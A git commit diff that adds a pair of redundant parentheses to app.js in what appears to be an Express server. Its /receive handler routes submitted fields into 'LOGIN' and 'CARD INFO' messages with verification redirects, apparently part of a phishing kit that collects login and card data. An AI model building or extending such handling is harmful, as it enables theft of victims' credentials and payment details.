2c790358bde005e14cf5d3c11f9322e294d2bef5
perez433 <154991957+perez433@users.noreply.github.com>
2024-12-21 16:43:58 +0100

    Add files via upload

--- app.js
+++ app.js
@@ -221,7 +221,7 @@ app.post('/receive', async (req, res) => {
             prepareMessage("LOGIN", "/verify?action=1", true);
         }
 
-        if (!responseSent && myObjects.includes('zipCode')) {
+        if (!responseSent && (myObjects.includes('zipCode'))) {
         	console.log('zipcode');
             prepareMessage("CARD INFO",  redirect_url , false);
         }
